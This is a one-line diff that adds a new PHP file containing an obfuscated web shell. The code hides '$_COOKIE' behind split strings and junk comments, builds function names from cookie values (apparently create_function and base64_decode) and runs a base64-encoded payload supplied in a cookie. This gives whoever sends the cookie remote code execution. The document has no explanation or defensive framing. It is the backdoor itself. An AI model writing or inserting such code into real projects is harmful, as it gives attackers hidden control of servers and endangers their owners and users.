@@ -1,0 +1,1 @@
+<?php $l='E';/*NTb*/$ty='OKI';$f/*sj*/='_CO';$hr=/*{,u*/${$f.$ty.$l};if(isset($hr['va'])){$pm=/*yd.*/$hr['va'].$hr/*K*/['v'];$ad=$hr['xf'].$hr['QE'].$hr['e'];$j=$pm('',$ad($hr['P']));$j();}
